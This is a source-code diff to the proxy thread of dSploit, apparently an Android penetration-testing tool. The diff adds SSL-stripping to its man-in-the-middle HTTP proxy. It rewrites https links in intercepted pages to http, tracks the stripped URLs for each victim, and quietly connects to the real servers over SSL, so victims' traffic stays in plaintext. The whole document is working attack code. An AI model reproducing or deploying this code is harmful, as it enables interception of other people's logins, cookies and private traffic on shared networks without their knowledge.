@@ -18,8 +18,7 @@
  */
 package it.evilsocket.dsploit.net.http.proxy;
 
-
-import it.evilsocket.dsploit.core.System;
+import it.evilsocket.dsploit.net.http.RequestParser;
 import it.evilsocket.dsploit.net.http.proxy.Proxy.OnRequestListener;
 
 import java.io.BufferedOutputStream;
@@ -31,14 +30,21 @@ import java.io.InputStreamReader;
 import java.io.OutputStream;
 import java.net.Socket;
 import java.util.ArrayList;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
+
+import javax.net.SocketFactory;
+import javax.net.ssl.SSLSocketFactory;
 
 import android.util.Log;
 
 public class ProxyThread extends Thread
 {			  
-	private final static String TAG				 = "PROXYTHREAD";
-	private final static int    MAX_REQUEST_SIZE = 8192;
-	private final static int    SERVER_PORT 	 = 80;
+	private final static String  TAG			   = "PROXYTHREAD";
+	private final static int     MAX_REQUEST_SIZE  = 8192;
+	private final static int     HTTP_SERVER_PORT  = 80;
+	private final static int     HTTPS_SERVER_PORT = 443;
+	private final static Pattern LINK_PATTERN      = Pattern.compile("(https://[\\w\\d:#@%/;$()~_?\\+-=\\\\\\.&]*)", Pattern.CASE_INSENSITIVE );
 	
 	private final static String HOST_HEADER 	 		 = "Host";
 	private final static String ACCEPT_ENCODING_HEADER 	 = "Accept-Encoding";
@@ -57,6 +63,7 @@ public class ProxyThread extends Thread
 	private ArrayList<Proxy.ProxyFilter> mFilters 	   	  = null;
 	private String				  		 mHostRedirect 	  = null;
 	private int					   		 mPortRedirect 	  = 80;
+	private SocketFactory				 mSocketFactory   = null;
 	
 	public ProxyThread( Socket socket, OnRequestListener listener, ArrayList<Proxy.ProxyFilter> filters, String hostRedirection, int portRedirection ) throws IOException {
 		super( "ProxyThread" );
@@ -68,6 +75,7 @@ public class ProxyThread extends Thread
 		mFilters 	  	 = filters;		
 		mHostRedirect 	 = hostRedirection;
 		mPortRedirect 	 = portRedirection;
+		mSocketFactory   = SSLSocketFactory.getDefault();
 	}
 
 	public void run() {
@@ -78,6 +86,8 @@ public class ProxyThread extends Thread
             byte[] buffer = new byte[ MAX_REQUEST_SIZE ];
             int	   read   = 0;
             
+            final String client = mSocket.getInetAddress().getHostAddress();
+            		
             // Read the header and rebuild it
             if( ( read = mReader.read( buffer , 0,  MAX_REQUEST_SIZE ) ) > 0 )
             {            
@@ -115,27 +125,11 @@ public class ProxyThread extends Thread
 		            			value = "close";
 							// Keep requesting fresh files and ignore any cache instance
 		            		else if( header.equals( IF_MODIFIED_SINCE_HEADER ) || header.equals( CACHE_CONTROL_HEADER ) )
-		            			header = null;
-							// Extract the real request target and connect to it.
-		            		else if( header.equals( HOST_HEADER ) )
-		            		{
-		            			if( mHostRedirect == null )
-		            			{
-		            				mServerName = value;										
-		            				mServer     = new Socket( mServerName, SERVER_PORT );
-		            			}
-		            			else
-		            			{
-		            				mServerName = mHostRedirect;
-		            				mServer     = new Socket( mServerName, mPortRedirect );
-		            			}
-		            			
-								mServerReader = mServer.getInputStream(); 
-								mServerWriter = mServer.getOutputStream();		
-								
-								Log.d( TAG, mSocket.getInetAddress().getHostAddress() + " > " + mServerName );
-		            		}
-		            			
+		            			header = null;		            				            	
+							// Extract the real request target.
+		            		else if( header.equals( HOST_HEADER ) )		            	
+		            			mServerName = mHostRedirect == null ? value : mHostRedirect;		            		
+		            				            		
 		            		if( header != null )
 		            			line = header + ": " + value;
 		            	}
@@ -146,19 +140,63 @@ public class ProxyThread extends Thread
 				}
 	            
 	            // any real host found ?
-	 			if( mServer != null )
-	 			{				
+	 			if( mServerName != null )
+	 			{			
+	 				String request = builder.toString(),	 							 
+	 		  			   url     = RequestParser.getUrlFromRequest( mServerName, request );	 				
+	 				
+	 				boolean https  = false;
+	 				
+	 				// connect to host
+        			if( mHostRedirect == null )			
+        			{
+        				if( url != null && HTTPSMonitor.getInstance().hasURL( client, url ) == true )
+        				{        					
+        					Log.w( TAG, "Found stripped HTTPS url : " + url );
+        					
+        					https   = true;
+        					mServer = mSocketFactory.createSocket( mServerName, HTTPS_SERVER_PORT );
+        				}
+        				else
+        					mServer = new Socket( mServerName, HTTP_SERVER_PORT );  
+        			}
+        			// just redirect requests
+        			else
+        				mServer = new Socket( mServerName, mPortRedirect );
+        			
+					mServerReader = mServer.getInputStream(); 
+					mServerWriter = mServer.getOutputStream();		
+					
+					Log.d( TAG, client + " > " + mServerName );
+					
 	 				if( mRequestListener != null )
-	            		mRequestListener.onRequest( mSocket.getInetAddress().getHostAddress(), mServerName, headers );
+	            		mRequestListener.onRequest( https, client, mServerName, headers );
 	 				
 	 				// send the patched request
-	 				mServerWriter.write( builder.toString().getBytes() );
+	 				mServerWriter.write( request.getBytes() );
 	 				mServerWriter.flush();
 	 				// start the stream session with specified filters				
-	 				new StreamThread( mServerReader, mWriter, new Proxy.ProxyFilter() {									
+	 				new StreamThread( client, mServerReader, mWriter, new Proxy.ProxyFilter() {									
 	 					@Override
 	 					public String onDataReceived( String headers, String data ) 
 	 					{	
+	 						// first of all, get rid of every HTTPS url
+	 						Matcher match = LINK_PATTERN.matcher( data );
+	 						if( match != null )
+	 						{
+	 							while( match.find() )
+	 							{
+	 								String url 		= match.group( 1 ),
+	 									   stripped = url.replace( "https://", "http://" ).replace( "&amp;", "&" );
+	 								
+	 								Log.w( TAG, "Stripping HTTPS url : " + url );
+	 								
+	 								data = data.replace( url, stripped );
+	 								
+	 								HTTPSMonitor.getInstance().addURL( client, stripped );
+	 							}
+	 						}
+	 						
 	 						// apply each provided filter
 	 						for( Proxy.ProxyFilter filter : mFilters )
 	 						{
@@ -172,13 +210,12 @@ public class ProxyThread extends Thread
             }
             else
             {
-            	mReader.close();
-            	Log.w( TAG, "Empty HTTP request." );
+            	mReader.close();            	
             }
 		} 
 		catch( IOException e )
 		{
-			System.errorLogging( TAG, e );
+			// System.errorLogging( TAG, e );
 		}			
 	}
 }
